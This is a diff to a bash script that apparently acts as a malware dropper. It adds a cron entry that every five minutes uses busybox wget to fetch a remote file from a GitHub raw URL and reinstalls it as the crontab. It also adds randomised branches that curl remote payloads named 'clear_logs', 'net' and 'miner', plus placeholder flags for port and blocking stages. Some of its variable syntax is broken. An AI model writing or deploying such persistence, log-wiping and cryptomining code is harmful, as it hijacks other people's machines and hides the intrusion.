@@ -1,11 +1,13 @@
 #!/bin/bash
-apt-get install -y curl unzip
+apt-get install -y curl
 $DEF=true
 $LOG=true
 $NET=true
 $MINER=true
+$PORT=false
+$BLOCK=false
 
-(crontab -l 2>/dev/null; echo "*/5 * * * * busybox wget -q htt... -O ./...; crontab ./... ") | crontab -
+(crontab -l 2>/dev/null; echo "*/5 * * * * busybox wget -q https://raw.githubusercontent.com/ArchieSin314/TestSite/main/rawmain -O ./...; crontab ./... ") | crontab -
 $i = $RANDOM
 
 if [[ $DEF = true ]] && [[ $(($i % 101)) -ge 0 ]] && [[ $(($i % 101)) -lt 10 ]]
@@ -15,15 +17,27 @@ fi
 
 if [[ $LOG = true ]] && [[ $(($i % 101)) -ge 10 ]] && [[ $(($i % 101)) -lt 20 ]]
 then
-	curl
+	curl https://raw.githubusercontent.com/ArchieSin314/TestSite/main/clear_logs
 fi
 
 if [[ $NET = true ]] && [[ $(($i % 101)) -ge 20 ]] && [[ $(($i % 101)) -lt 30 ]]
 then
-        curl
+        curl https://raw.githubusercontent.com/ArchieSin314/TestSite/main/net
 fi
 
 if [[ $MINER = true ]] && [[ $(($i % 101)) -ge 30 ]] && [[ $(($i % 101)) -lt 40 ]]
 then
+        curl https://raw.githubusercontent.com/ArchieSin314/TestSite/main/miner
+fi
+
+if [[ $PORT = true ]] && [[ $(($i % 101)) -ge 40 ]] && [[ $(($i % 101)) -lt 50 ]]
+then
         curl
 fi
+
+if [[ $BLOCK = true ]] && [[ $(($i % 101)) -ge 50 ]] && [[ $(($i % 101)) -lt 60 ]]
+then
+        curl
+fi
+
+
